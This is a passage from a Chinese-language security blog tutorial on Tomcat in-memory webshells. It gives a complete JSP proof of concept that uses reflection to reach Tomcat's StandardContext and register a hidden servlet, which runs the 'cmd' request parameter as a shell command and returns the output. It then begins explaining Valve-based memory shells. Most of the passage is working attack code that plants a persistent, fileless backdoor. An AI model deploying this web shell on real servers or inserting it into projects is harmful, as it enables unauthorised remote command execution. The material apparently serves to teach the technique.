</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>åˆ›å»ºWrapper</strong>ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//é¢„è®¾ç½®Servletåç§°</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;123&#34;</span><span class="p">;</span><span class="w"> </span><span class="c1">//åç§°éšä¾¿</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//è·å–StandardWrapper</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Wrapper</span><span class="p">)</span><span class="n">standardContext</span><span class="p">.</span><span class="na">createWrapper</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ç›¸å…³é…ç½®</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setLoadOnStartup</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//wrapper.setServletClass(name); //æœ‰æ— æ— æ‰€è°“</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setServlet</span><span class="p">(</span><span class="n">badServlet</span><span class="p">);</span><span class="w"> </span><span class="c1">//é‡ç‚¹è®¾ç½®ä¸ºWrapperç‚¹åœ¨è¿™é‡Œ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//å°†å…¶åŠ å…¥åˆ°å½“å‰ç¯å¢ƒçš„StandardContextä¸­</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addChild</span><span class="p">(</span><span class="n">wrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addServletMappingDecoded</span><span class="p">(</span><span class="s">&#34;/servlet&#34;</span><span class="p">,</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><h6 id="æœ€ç»ˆpoc-2">æœ€ç»ˆPOC
</h6><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.lang.reflect.Field&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.StandardContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.IOException&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.PrintWriter&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.InputStream&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.util.Scanner&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;javax.servlet.*&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.core.ApplicationContext&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;org.apache.catalina.Wrapper&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.PrintWriter&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">import</span><span class="o">=</span><span class="s">&#34;java.io.PrintWriter&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="err">@</span><span class="w"> </span><span class="n">page</span><span class="w"> </span><span class="n">contentType</span><span class="o">=</span><span class="s">&#34;text/html;charset=UTF-8&#34;</span><span class="w"> </span><span class="n">language</span><span class="o">=</span><span class="s">&#34;java&#34;</span><span class="w"> </span><span class="o">%&gt;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">&lt;%</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Servlet</span><span class="w"> </span><span class="n">badServlet</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Servlet</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">init</span><span class="p">(</span><span class="n">ServletConfig</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">ServletConfig</span><span class="w"> </span><span class="nf">getServletConfig</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">service</span><span class="p">(</span><span class="n">ServletRequest</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">,</span><span class="w"> </span><span class="n">ServletResponse</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">ServletException</span><span class="p">,</span><span class="w"> </span><span class="n">IOException</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;servletå¯åŠ¨&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">cmd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletRequest</span><span class="p">.</span><span class="na">getParameter</span><span class="p">(</span><span class="s">&#34;cmd&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="kt">boolean</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">osTyp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">System</span><span class="p">.</span><span class="na">getProperty</span><span class="p">(</span><span class="s">&#34;os.name&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">osTyp</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">osTyp</span><span class="p">.</span><span class="na">toLowerCase</span><span class="p">().</span><span class="na">contains</span><span class="p">(</span><span class="s">&#34;win&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">isLinux</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">cmds</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">isLinux</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;sh&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;-c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">}</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="o">[]</span><span class="p">{</span><span class="s">&#34;cmd.exe&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;/c&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">cmd</span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">InputStream</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Runtime</span><span class="p">.</span><span class="na">getRuntime</span><span class="p">().</span><span class="na">exec</span><span class="p">(</span><span class="n">cmds</span><span class="p">).</span><span class="na">getInputStream</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">Scanner</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Scanner</span><span class="p">(</span><span class="n">in</span><span class="p">).</span><span class="na">useDelimiter</span><span class="p">(</span><span class="s">&#34;\\a&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">String</span><span class="w"> </span><span class="n">output</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">hasNext</span><span class="p">()</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">s</span><span class="p">.</span><span class="na">next</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletResponse</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">output</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">flush</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">out</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getServletInfo</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">destroy</span><span class="p">(){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">};</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ServletContext</span><span class="w">  </span><span class="n">servletContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">request</span><span class="p">.</span><span class="na">getSession</span><span class="p">().</span><span class="na">getServletContext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">servletContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field0</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">ApplicationContext</span><span class="w"> </span><span class="n">applicationContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">ApplicationContext</span><span class="p">)</span><span class="n">field0</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">servletContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">field1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">applicationContext</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;context&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">field1</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">StandardContext</span><span class="w"> </span><span class="n">standardContext</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">StandardContext</span><span class="p">)</span><span class="n">field1</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">applicationContext</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//é¢„è®¾ç½®Servletåç§°</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">badServlet</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getName</span><span class="p">();</span><span class="w"> </span><span class="c1">//åç§°éšä¾¿</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//è·å–StandardWrapper</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Wrapper</span><span class="w"> </span><span class="n">wrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Wrapper</span><span class="p">)</span><span class="n">standardContext</span><span class="p">.</span><span class="na">createWrapper</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//ç›¸å…³é…ç½®</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setLoadOnStartup</span><span class="p">(</span><span class="n">1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//wrapper.setServletClass(name); //æœ‰æ— æ— æ‰€è°“</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">wrapper</span><span class="p">.</span><span class="na">setServlet</span><span class="p">(</span><span class="n">badServlet</span><span class="p">);</span><span class="w"> </span><span class="c1">//é‡ç‚¹è®¾ç½®ä¸ºWrapperç‚¹åœ¨è¿™é‡Œ</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//å°†å…¶åŠ å…¥åˆ°å½“å‰ç¯å¢ƒçš„StandardContextä¸­</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addChild</span><span class="p">(</span><span class="n">wrapper</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">standardContext</span><span class="p">.</span><span class="na">addServletMappingDecoded</span><span class="p">(</span><span class="s">&#34;/servlet&#34;</span><span class="p">,</span><span class="n">name</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="o">%&gt;</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¼€å¯æœåŠ¡å™¨åè¿˜æ˜¯åŒæ ·çš„æ“ä½œæ‰§è¡Œä¸€éå³å¯ï¼ŒæˆåŠŸå‘½ä»¤æ‰§è¡Œï¼š</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055598.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240903222118658"
	
	
></p>
<h4 id="valve-å‹å†…å­˜é©¬">Valve å‹å†…å­˜é©¬
</h4><p>åœ¨Tomcatä¸­å®šä¹‰äº†ä¸¤ä¸ªæ¥å£ï¼Œåˆ†åˆ«æ˜¯Pipelineå’ŒValveã€‚Valveå¯ä»¥ç†è§£ä¸ºPipelineçš„åŸºæœ¬å•ä½ï¼Œç”¨äºå¤„ç†ä¼ å…¥è¯·æ±‚å’Œä¼ å‡ºè¯·æ±‚ã€‚</p>
<p>Tomcatçš„ç®¡é“æœºåˆ¶æ˜¯æŒ‡åœ¨å¤„ç†HTTPè¯·æ±‚æ—¶ï¼Œå°†ä¸€ç³»åˆ—çš„ValveæŒ‰é¡ºåºé“¾æ¥åœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå¤„ç†ç®¡é“ã€‚æ¯ä¸ªValveè´Ÿè´£åœ¨è¯·æ±‚å¤„ç†è¿‡ç¨‹ä¸­æ‰§è¡Œç‰¹å®šçš„ä»»åŠ¡ï¼Œä¾‹å¦‚è®¤è¯ã€æ—¥å¿—è®°å½•ã€å®‰å…¨æ€§æ£€æŸ¥ç­‰ã€‚è¿™æ ·ï¼Œè¯·æ±‚å°±ä¼šåœ¨ç®¡é“ä¸­ä¾æ¬¡ç»è¿‡æ¯ä¸ªValveï¼Œæ¯ä¸ªValveéƒ½å¯ä»¥å¯¹è¯·æ±‚è¿›è¡Œå¤„ç†æˆ–è€…ä¼ é€’ç»™ä¸‹ä¸€ä¸ªValve</p>
<p><strong>Tomcatæ¯ä¸ªå±‚çº§çš„å®¹å™¨ï¼ˆEngineã€Hostã€Contextã€Wrapperï¼‰éƒ½æœ‰ç›¸å¯¹åº”çš„å®ç°Valveå¯¹è±¡ï¼ˆStandardEngineValveã€StandardHostValveã€StandardContextValveã€StandardWrapperValveï¼‰</strong>ï¼Œè¿™äº›ValveåŒæ—¶ç»´æŠ¤ä¸€ä¸ªPipelineå®ä¾‹ï¼ˆStandardPipelineï¼‰ã€‚åœ¨æ¯ä¸ªå±‚çº§å®¹å™¨ä¸­çš„ç®¡é“ä¸­éƒ½æœ‰è‡³å°‘æœ‰ä¸€ä¸ªValveï¼Œç§°ä¹‹ä¸ºåŸºç¡€é˜€ï¼Œå…¶ä½œç”¨æ˜¯è¿æ¥å½“å‰å®¹å™¨çš„ä¸‹ä¸€ä¸ªå®¹å™¨ã€‚</p>
<p><img src="https://blog-1329971559.cos.ap-beijing.myqcloud.com/images/202409280055525.png?imageSlim"
	
	
	
	loading="lazy"
	
		alt="image-20240904143403453"
	
	
></p>
<p>çœ‹Valveæ¥å£çš„å®šä¹‰ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.apache.catalina</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.IOException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">javax.servlet.ServletException</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.catalina.connector.Request</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.apache.catalina.connector.Response</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">interface</span> <span class="nc">Valve</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//è·å–ä¸‹ä¸€ä¸ªValveï¼Œnullä»£è¡¨æœ€åä¸€ä¸ª</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Valve</span><span class="w"> </span><span class="nf">getNext</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//è®¾ç½®ä¸‹ä¸€ä¸ªValve</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kt">void</span><span class="w"> </span><span class="nf">setNext</span><span class="p">(</span><span class="n">Valve</span><span class="w"> </span><span class="n">valve</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
